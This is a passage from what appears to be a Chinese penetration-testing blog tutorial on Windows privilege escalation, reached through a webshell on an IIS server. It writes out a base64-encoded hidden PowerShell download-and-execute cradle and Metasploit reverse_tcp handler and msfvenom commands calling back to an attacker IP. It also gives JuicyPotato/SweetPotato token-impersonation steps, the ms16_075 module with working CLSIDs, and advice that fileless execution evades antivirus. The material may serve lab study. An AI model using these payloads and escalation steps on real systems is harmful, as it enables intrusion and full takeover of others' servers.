配置64位反弹载荷</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kali本机IP</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置端口（注意避免端口冲突）</span></span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动模块</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602668763_fhwr35.webp" loading='lazy'></p>
+<p> 复制输出的整段 powershell 代码，粘贴到蚁剑终端执行。  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlAE4APQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZQBOAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZQBOAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMwAuADEAMwAxADoAOAAwADgAMAAvAEsAVABrAE4AdQBmAG4ASgBoAEsAQgB3AGsAdgAvAG4AdAA4ADMAQQBvAEkAcABOAHIAOQBlADMATAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMwAuADEAMwAxADoAOAAwADgAMAAvAEsAVABrAE4AdQBmAG4ASgBoAEsAQgB3AGsAdgAnACkAKQA7AA==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602671085_q2btal.webp" loading='lazy'></p>
+<p><code>Meterpreter session 1 opened</code>表明已经拿到目标服务器完整系统权限，会话编号：<strong>1</strong></p>
+<ol>
+<li>进入被控主机会话</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
+
+<p>回车后命令前缀会从 <code>msf &gt;</code> 变成 <code>meterpreter &gt;</code>，代表进入服务器内部。</p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602673174_xjki44.webp" loading='lazy'></p>
+<p><strong>补充：</strong></p>
+<p><code>**show targets**</code>** VS**<code>** show options**</code></p>
+<ol>
+<li><strong>show targets</strong></li>
+</ol>
+<p> 查看这个模块所有可选择的目标类型、对应的数字编号  </p>
+<table>
+<thead>
+<tr>
+<th>Id</th>
+<th>名称</th>
+<th>用途</th>
+<th>使用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>Python</td>
+<td>生成 Python 一句话载荷</td>
+<td>Linux&#x2F;mac 用</td>
+</tr>
+<tr>
+<td>1</td>
+<td>PHP</td>
+<td>PHP 网页一句话</td>
+<td>网站渗透用</td>
+</tr>
+<tr>
+<td>2</td>
+<td>PSH</td>
+<td>PowerShell 简写命令（内存加载无落地文件）</td>
+<td>Windows powershell 上线用</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Regsvr32</td>
+<td>绕过 PowerShell 防火墙、Defender 拦截</td>
+<td>Powershell 被封禁时备选</td>
+</tr>
+<tr>
+<td>6</td>
+<td>PSH (Binary)</td>
+<td>完整 PowerShell 二进制载荷</td>
+<td>兼容性更强</td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li>**show options **</li>
+</ol>
+<p> 查看所有需要配置的参数：LHOST、LPORT、PAYLOAD、TARGET 等全部配置项  </p>
+<h3 id="阶段三：Meterpreter-会话基础操作"><a href="#阶段三：Meterpreter-会话基础操作" class="headerlink" title="阶段三：Meterpreter 会话基础操作"></a>阶段三：Meterpreter 会话基础操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo # 系统信息</span><br><span class="line">meterpreter &gt; getuid # 当前用户</span><br><span class="line">meterpreter &gt; getprivs # 查看权限</span><br><span class="line">meterpreter &gt; ps # 进程列表</span><br><span class="line">meterpreter &gt; migrate &lt;PID&gt; # 迁移进程(推荐迁移到稳定进程)</span><br><span class="line">meterpreter &gt; background # 后台会话</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602674786_oa599q.webp" loading='lazy'></p>
+<hr>
+<h3 id="阶段四：Windows-本地提权"><a href="#阶段四：Windows-本地提权" class="headerlink" title="阶段四：Windows 本地提权"></a>阶段四：Windows 本地提权</h3><h3 id="阶段五：提权后后渗透操作"><a href="#阶段五：提权后后渗透操作" class="headerlink" title="阶段五：提权后后渗透操作"></a>阶段五：提权后后渗透操作</h3><hr>
+<h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><h2 id="方法一：Token-模拟-SweetPotato-JuicyPotato"><a href="#方法一：Token-模拟-SweetPotato-JuicyPotato" class="headerlink" title="方法一：Token 模拟(SweetPotato &#x2F; JuicyPotato)"></a>方法一<img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602676529_gx2fni.webp" loading='lazy'>：Token 模拟(SweetPotato &#x2F; JuicyPotato)</h2><h3 id="1-JuicyPotato-SweetPotato-是什么？"><a href="#1-JuicyPotato-SweetPotato-是什么？" class="headerlink" title="1. JuicyPotato&#x2F;SweetPotato 是什么？"></a>1. JuicyPotato&#x2F;SweetPotato 是什么？</h3><h4 id="1-1-基础共性"><a href="#1-1-基础共性" class="headerlink" title="1.1 基础共性"></a>1.1 基础共性</h4><p>二者都属于 <strong>Windows 本地权限提升工具（土豆系列提权工具）</strong></p>
+<p><strong>核心功能</strong>：在拥有 <code>SeImpersonatePrivilege（身份模拟权限）</code> 的低权限账户下（IIS站点账户、数据库服务账号等），窃取系统最高身份令牌，把权限提升至 Windows 顶级权限：<strong>NT AUTHORITY\SYSTEM</strong>。</p>
+<p><strong>必备前提</strong>：执行 <code>whoami /priv</code> 查看权限，<code>SeImpersonatePrivilege 已启用</code> 才可提权；<br>网站运行账户默认开启该权限，是Web渗透最常用提权手段。</p>
+<p><strong>底层通用原理</strong>：借助Windows RPC、系统服务的NTLM认证机制，诱导SYSTEM权限的系统服务主动回连，劫持其身份凭证令牌，复用令牌创建程序，从而拿到系统权限。</p>
+<h4 id="1-2-JuicyPotato（多汁土豆）"><a href="#1-2-JuicyPotato（多汁土豆）" class="headerlink" title="1.2 JuicyPotato（多汁土豆）"></a>1.2 JuicyPotato（多汁土豆）</h4><ol>
+<li>诞生背景</li>
+</ol>
+<p>RottenPotato（烂土豆）迭代升级版，Windows提权经典老牌工具，网安教学、CTF、老旧靶机标配工具。</p>
+<ol start="2">
+<li>利用方式</li>
+</ol>
+<p>仅依靠 <strong>DCOM组件漏洞</strong> 完成令牌劫持。</p>
+<ol start="3">
+<li>适配操作系统</li>
+</ol>
+<p>✅ 完美兼容：Windows 7、Windows Server 2008 &#x2F; 2012、Win10 1809 之前早期版本<br>❌ 局限性：Win10 1809之后、Server2019及以上新版系统，微软补丁封堵DCOM漏洞，基本无法使用。</p>
+<ol start="4">
+<li><p>使用特点</p>
+</li>
+<li><p>需要手动指定监听端口、COM组件ID（CLSID），需要简单配置参数；</p>
+</li>
+<li><p>在未打补丁的Win2008环境运行极其稳定；</p>
+</li>
+<li><p>只能启动CMD、反弹shell等指定程序。</p>
+</li>
+</ol>
+<p>常用执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -l 1337 -p cmd.exe -t *</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-3-SweetPotato（甜土豆）"><a href="#1-3-SweetPotato（甜土豆）" class="headerlink" title="1.3 SweetPotato（甜土豆）"></a>1.3 SweetPotato（甜土豆）</h4><ol>
+<li>诞生背景</li>
+</ol>
+<p>微软不断封堵DCOM漏洞后推出的整合型工具，为了解决多汁土豆新版系统无法利用的问题。</p>
+<ol start="2">
+<li>利用方式</li>
+</ol>
+<p>内置4套提权链路，自动依次尝试：<br>DCOM、EfsRpc、WinRM、PrintSpoofer（打印后台服务漏洞）<br>一条利用通道被补丁拦截，会自动切换下一种，容错率极高。</p>
+<ol start="3">
+<li>适配操作系统</li>
+</ol>
+<p>全系列Windows：Win7 ~ Win11、Windows Server 2008 ~ Server 2022，老旧、新服务器都可以尝试。</p>
+<ol start="4">
+<li><p>使用特点</p>
+</li>
+<li><p>一键自动化运行，无需手动填写端口、CLSID参数，新手友好；</p>
+</li>
+<li><p>依靠打印服务漏洞，即便DCOM被封禁，依旧可完成提权；</p>
+</li>
+<li><p>实战内网渗透首选工具。</p>
+</li>
+</ol>
+<p>常用执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SweetPotato.exe -p cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-4-对比"><a href="#1-4-对比" class="headerlink" title="1.4 对比"></a>1.4 对比</h4><table>
+<thead>
+<tr>
+<th>对比维度</th>
+<th>JuicyPotato</th>
+<th>SweetPotato</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>利用途径</td>
+<td>仅DCOM单一方式</td>
+<td>多漏洞方式集成，自动切换</td>
+</tr>
+<tr>
+<td>系统兼容</td>
+<td>仅老版Windows（2008首选）</td>
+<td>新旧所有Windows全覆盖</td>
+</tr>
+<tr>
+<td>操作难度</td>
+<td>需要配置参数，稍繁琐</td>
+<td>一键执行，简单易用</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>Win2008靶场</td>
+<td>真实企业内网、各类新版服务器</td>
+</tr>
+</tbody></table>
+<h4 id="1-5-渗透流程中的位置"><a href="#1-5-渗透流程中的位置" class="headerlink" title="1.5 渗透流程中的位置"></a>1.5 渗透流程中的位置</h4><p>蚁剑连接网站（低权限）→ 上传土豆工具至服务器临时目录 → 运行工具提权至SYSTEM → 抓取账号密码、内网漫游、搭建后门。</p>
+<h3 id="2-适用性验证"><a href="#2-适用性验证" class="headerlink" title="2. 适用性验证"></a>2. 适用性验证</h3><p>验证 SeImpersonatePrivilege：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getprivs</span><br><span class="line"># 关键输出:</span><br><span class="line">SeImpersonatePrivilege</span><br><span class="line">SeImpersonatePrivilege Impersonate a client after authentication Enabled</span><br></pre></td></tr></table></figure>
+
+<p>只要 IIS 以 NETWORK SERVICE 或 ApplicationPoolIdentity 运行，必定拥有此权限。</p>
+<h3 id="3-漏洞原理"><a href="#3-漏洞原理" class="headerlink" title="3. 漏洞原理"></a>3. 漏洞原理</h3><h4 id="3-1-这不是Bug，是设计缺陷"><a href="#3-1-这不是Bug，是设计缺陷" class="headerlink" title="3.1 这不是Bug，是设计缺陷"></a>3.1 这不是Bug，是设计缺陷</h4><p>SweetPotato &#x2F; JuicyPotato 利用的不是某个具体 CVE 漏洞，而是 Windows 架构中两个设计特性组合造成的权限边界突破：</p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>描述</th>
+<th>设计的初衷</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SeImpersonatePrivilege</td>
+<td>允许服务账户 “扮演” 连接它的客户端</td>
+<td>让 IIS 模拟远程用户，以用户身份访问文件</td>
+</tr>
+<tr>
+<td>COM 激活回调</td>
+<td>激活 COM 对象时可以指定回调管道</td>
+<td>让 COM 客户端和服务端建立双向通信</td>
+</tr>
+</tbody></table>
+<p>问题出在：这两个特性单独使用都没问题，但结合起来就产生了越权——NETWORK SERVICE 可以让 SYSTEM 来连接自己，然后模拟 SYSTEM。</p>
+<h4 id="3-2-SeImpersonatePrivilege-为什么是”漏洞”"><a href="#3-2-SeImpersonatePrivilege-为什么是”漏洞”" class="headerlink" title="3.2 SeImpersonatePrivilege 为什么是”漏洞”"></a>3.2 SeImpersonatePrivilege 为什么是”漏洞”</h4><p><strong>正常场景(IIS 的预期用法)：</strong></p>
+<p><code>外网普通访客 → HTTP访问网站 → IIS进程(NETWORK SERVICE低权限账户) → 模拟访客低权限身份读写服务器文件</code></p>
+<p>规则约束：IIS 模拟之后，权限只会变得更低，只能执行访客允许的操作，无法向上获取更高权限，全程安全无害。</p>
+<p><strong>攻击场景(反向利用)：</strong><br>攻击者已经拿下了 IIS 的 NETWORK SERVICE 低权限账号，反向利用模拟机制：</p>
+<ol>
+<li>攻击者调用 COM 组件，跟系统服务控制器（SCM）通信</li>
+<li>让 SCM 启动一个 SYSTEM 最高权限 的系统后台进程</li>
+<li>诱导这个 SYSTEM 进程主动反向连接攻击者预先搭建的管道端口</li>
+<li>进程发起身份认证时，攻击者劫持认证令牌，借用令牌模拟 SYSTEM 身份。最终结果：低权限账户 → 提升至系统顶级 SYSTEM 权限</li>
+</ol>
+<p>缺陷：</p>
+<ol>
+<li>SeImpersonatePrivilege <strong>没有限制”只能模拟比自己权限低的用户”</strong>。<br>只要你拥有这个权限，你就可以模拟任何连接你的人，包括 SYSTEM。</li>
+<li>SCM 在转发回调地址时，<strong>没有验证回调目标</strong>是否可信。攻击者可以指定任意管道名，而 SYSTEM 进程会无条件连接。</li>
+</ol>
+<h3 id="4-土豆提权完整权限流转"><a href="#4-土豆提权完整权限流转" class="headerlink" title="4. 土豆提权完整权限流转"></a>4. 土豆提权完整权限流转</h3><h4 id="T0-初始状态（提权前置条件）"><a href="#T0-初始状态（提权前置条件）" class="headerlink" title="T0 初始状态（提权前置条件）"></a>T0 初始状态（提权前置条件）</h4><p>攻击者当前身份：<code>NETWORK SERVICE</code>（IIS网站运行低权限账户）<br>核心拥有特权：<code>SeImpersonatePrivilege</code>（身份模拟权限）<br>✅ 必备基础：没有这个权限，整套流程无法启动。</p>
+<h4 id="T1：攻击者搭建接收通道"><a href="#T1：攻击者搭建接收通道" class="headerlink" title="T1：攻击者搭建接收通道"></a>T1：攻击者搭建接收通道</h4><p>操作：创建<strong>命名管道</strong> <code>\\.\pipe\evil</code>，并持续监听等待客户端接入</p>
+<ul>
+<li>命名管道：Windows进程间通信的一种通道，可以实现两个进程互相收发数据；</li>
+<li>作用：预留一个连接入口，专门用来接收后续SYSTEM权限进程的主动连接。</li>
+</ul>
+<h4 id="T2：调用COM接口，唤起SYSTEM权限进程"><a href="#T2：调用COM接口，唤起SYSTEM权限进程" class="headerlink" title="T2：调用COM接口，唤起SYSTEM权限进程"></a>T2：调用COM接口，唤起SYSTEM权限进程</h4><p>调用系统函数：<code>CoGetInstanceFromIStorage()</code><br>内部流转逻辑：</p>
+<ol>
+<li>函数提交请求给 <strong>SCM（服务控制管理器，Windows系统核心服务管理组件）</strong></li>
+<li>SCM根据传入的CLSID（COM组件唯一编号），启动一个<strong>默认以SYSTEM最高权限运行的COM系统进程</strong></li>
+<li>攻击者提前指定回调地址：让刚启动的SYSTEM进程，必须去连接刚才创建的管道 <code>\\.\pipe\evil</code></li>
+</ol>
+<p>核心漏洞点：SCM不会校验管道地址是否安全，无条件听从攻击者指定的回调路径。</p>
+<h4 id="T3：SYSTEM进程接入管道，窃取身份令牌"><a href="#T3：SYSTEM进程接入管道，窃取身份令牌" class="headerlink" title="T3：SYSTEM进程接入管道，窃取身份令牌"></a>T3：SYSTEM进程接入管道，窃取身份令牌</h4><ol>
+<li>SYSTEM权限的COM进程主动连上攻击者监听的命名管道；</li>
+<li>攻击者调用API：<code>ImpersonateNamedPipeClient()</code></li>
+<li>效果：利用SeImpersonatePrivilege特权，直接模拟管道客户端（SYSTEM进程）身份<br>👉 此刻攻击者自身线程的身份令牌（Token）已经临时变成 <strong>SYSTEM</strong><br>⚠️ 局限：这只是<strong>线程临时令牌</strong>，不能直接用来创建新程序，必须转换格式。</li>
+</ol>
+<h4 id="T4：复制令牌，转换为进程主令牌"><a href="#T4：复制令牌，转换为进程主令牌" class="headerlink" title="T4：复制令牌，转换为进程主令牌"></a>T4：复制令牌，转换为进程主令牌</h4><p>调用函数：<code>DuplicateTokenEx()</code></p>
+<ul>
+<li>将线程层面的临时模拟令牌，复制、转换为 <strong>Primary Token（主令牌）</strong></li>
+<li>主令牌：Windows允许用来创建全新进程的标准身份凭证，具备完整的SYSTEM权限。</li>
+</ul>
+<h4 id="T5：使用SYSTEM令牌启动新程序，提权收尾"><a href="#T5：使用SYSTEM令牌启动新程序，提权收尾" class="headerlink" title="T5：使用SYSTEM令牌启动新程序，提权收尾"></a>T5：使用SYSTEM令牌启动新程序，提权收尾</h4><p>调用函数：<code>CreateProcessWithToken()</code><br>传入上一步拿到的SYSTEM主令牌，启动CMD、反弹Shell等任意程序；<br>最终结果：新诞生的进程全程以 <strong>NT AUTHORITY\SYSTEM</strong> 系统最高权限运行，本地权限提升完成。</p>
+<p><strong>总结</strong></p>
+<p>低权限账号开管道监听 → 调用系统服务拉起SYSTEM进程诱导其连管道 → 模拟窃取SYSTEM令牌 → 转换令牌格式 → 用最高令牌启动程序，实现提权。</p>
+<h3 id="5-实操流程"><a href="#5-实操流程" class="headerlink" title="5. 实操流程"></a>5. 实操流程</h3><h4 id="方案-A：MSF-ms16-075-reflection-juicy-无文件落地"><a href="#方案-A：MSF-ms16-075-reflection-juicy-无文件落地" class="headerlink" title="方案 A：MSF ms16_075_reflection_juicy (无文件落地 )"></a><u>方案 A：MSF ms16_075_reflection_juicy (无文件落地 )</u></h4><p>无文件落地：<strong>所有提权代码、反弹后门全程仅在目标服务器内存中运行，不会向硬盘写入 exe、bat 等任何实体文件</strong>。</p>
+<p>依靠 <strong>反射式 DLL 注入</strong> + MS16-075 漏洞封装模块，Metasploit 把 JuicyPotato 整套令牌劫持逻辑内置集成，无需手动上传土豆工具程序。 底层原理和 JuicyPotato 完全一致：依靠<code>SeImpersonatePrivilege</code>权限、指定 CLSID 调用 COM 组件、劫持 SYSTEM 身份令牌完成提权。</p>
+<p>模块介绍：</p>
+<p><strong>exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicy</strong></p>
+<p>MS16-075  –&gt; Windows 本地提权漏洞（Juicy Potato 多汁土豆）  </p>
+<p>普通用户权限 → 直接提升至 SYSTEM 最高系统权限  </p>
+<p>✅ 支持： Windows 7 &#x2F; Windows Server 2008 R2、Win10 早期版本、Server2012 大部分版本 系统打补丁之前均可利用 </p>
+<p>❌ 不支持： 打过 MS16-075 官方安全补丁的系统、新版 Win10&#x2F;Win11</p>
+<p><strong>步骤：</strong></p>
+<ol>
+<li>前置条件</li>
+</ol>
+<p>已经将蚁剑获取的 IIS 低权限会话，成功转入 MSF，得到编号为SESSION 1的 Meterpreter 低权限会话。</p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602678433_0szzce.webp" loading='lazy'></p>
+<ol start="2">
+<li>MSF 内执行命令</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 后台挂起当前会话，回到 MSF 主控台</span></span><br><span class="line">background</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载多汁土豆提权模块</span></span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要提权的低权限会话</span></span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置提权成功后反弹会话的载荷</span></span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填写攻击机Kali地址、监听端口</span></span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填入Win2008 R2高成功率COM组件CLSID</span></span><br><span class="line"><span class="built_in">set</span> CLSID &#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键自动执行全套内存提权流程</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602680446_5ynxux.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602682444_4a1gkn.webp" loading='lazy'></p>
+<ol start="3">
+<li>run 执行后内部过程</li>
+</ol>
+<ul>
+<li>MSF 通过现有低权限会话，在目标内存加载提权代码；</li>
+<li>调用指定 CLSID 唤起 SYSTEM 权限系统进程，诱导进程回连管道；</li>
+<li>劫持、复制 SYSTEM 身份令牌；</li>
+<li>内存中直接生成反弹 Shell，回连 Kali 监听端口；</li>
+<li>MSF 接收全新的 SYSTEM 最高权限 Meterpreter 会话。</li>
+</ul>
+<ol start="4">
+<li>核心优势</li>
+</ol>
+<ul>
+<li>磁盘无恶意文件留存，杀毒软件无法扫描捕获，隐蔽性极强；</li>
+<li>操作简洁，无需编写批处理、上传多个工具文件；</li>
+<li>痕迹极少，是 Windows 土豆提权的首选方式。</li>
+</ul>
+<ol start="5">
+<li>会话区分</li>
+</ol>
+<p>原本的 SESSION 1 依旧是低权限状态，程序运行后会生成独立的新会话，新会话拥有系统最高权限。</p>
+<p><strong>Windows Server 2008 R2 可用 CLSID</strong></p>
+<table>
+<thead>
+<tr>
+<th>CLSID</th>
+<th align="center">说明</th>
+<th align="center">成功率</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</td>
+<td align="center">Windows Update</td>
+<td align="center">高</td>
+</tr>
+<tr>
+<td>{B52D54BB-4818-4EB9-AA80-F9EAD44A6A39}</td>
+<td align="center">Network Setup</td>
+<td align="center">高</td>
+</tr>
+<tr>
+<td>{03E0E6C8-364B-49DE-8C5C-41B4E4E6C6C2}</td>
+<td align="center">Windows Media Player</td>
+<td align="center">中</td>
+</tr>
+<tr>
+<td>{659cdea7-489e-11d9-a9cd-000d56965251}</td>
+<td align="center">BITS</td>
+<td align="center">中</td>
+</tr>
+</tbody></table>
+<p>模块特点：<br>反射式 DLL 注入到当前进程，不写入磁盘<br>自动遍历 CLSID 直到成功<br>成功后返回新的 SYSTEM 权限 Meterpreter 会话</p>
+<h4 id="方案-B：JuicyPotato-传统版-有文件落地-❌"><a href="#方案-B：JuicyPotato-传统版-有文件落地-❌" class="headerlink" title="方案 B：JuicyPotato 传统版(有文件落地 ❌)"></a>方案 B：JuicyPotato 传统版(有文件落地 ❌)</h4><p>需要落地的 EXE 和 BAT 文件，杀软可能检测。当方案 A 因 CLSID 不匹配或环境限制不可用时作为备选。</p>
+<p><strong>阶段 1：前置准备</strong></p>
+<ol>
+<li>拿到初始低权限 shell：通过一句话木马、蚁剑连接目标服务器，当前权限<code>NETWORK SERVICE</code>（IIS 网站账户，低权限），自带<code>SeImpersonatePrivilege</code>模拟权限。</li>
+<li>MSF 开启监听（等待最高权限木马回连）：</li>
+</ol>
+<p>Kali 端打开 Metasploit，配置反向 TCP 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131  </span><br><span class="line"><span class="built_in">set</span> LPORT 5555             </span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>执行后持续等待目标服务器主动反弹连接。</p>
+<ol start="3">
+<li>下载 JuicyPotato 工具，上传至目标服务器</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kali 下载土豆工具</span></span><br><span class="line">wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</span><br><span class="line"><span class="comment"># 在初始 meterpreter 会话里，上传工具到系统临时目录</span></span><br><span class="line">meterpreter &gt; upload JuicyPotato.exe C:\\Windows\\Temp\\jp.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602684497_i0dwnl.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602687121_ej9h2b.webp" loading='lazy'></p>
+<p>报错提示说：<code>/var/www/html/</code> 目录下找不到 </p>
+<p> 这个文件  。因此要把这个文件移动到<code>/var/www/html/</code> 目录下。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> JuicyPotato.exe /var/www/html/ </span><br><span class="line">upload JuicyPotato.exe C:\\Windows\\Temp\\jp.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602688837_ta78yo.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602689883_m52cmk.webp" loading='lazy'></p>
+<p>上传完成后，目标路径：<code>C:\Windows\Temp\jp.exe</code></p>
+<ol start="4">
+<li>生成反弹木马 p.exe</li>
+</ol>
+<p>用 msfvenom 生成 Windows 反弹程序，同样上传到 <code>C:\Windows\Temp\p.exe</code> 作用：最终提权成功后，以 SYSTEM 权限运行它，反弹最高权限会话到 Kali。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=5555 -f exe -o p.exe</span><br></pre></td></tr></table></figure>
+
+<p>再上传，和传JuicyPotato 工具一样。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mv</span> p.exe /var/www/html </span><br><span class="line">upload p.exe C:\\Windows\\Temp\\p.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602691670_blwhcs.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602692850_bttjep.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602694864_wctp32.webp" loading='lazy'></p>
+<p>⭐这里总结一下三种上传文件的方式：</p>
+<ol>
+<li><strong>Meterpreter upload 命令</strong><br>条件：已经拿到初始反弹Meterpreter会话<br>用法：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload Kali本地文件路径 目标Windows存放路径</span><br></pre></td></tr></table></figure>
+
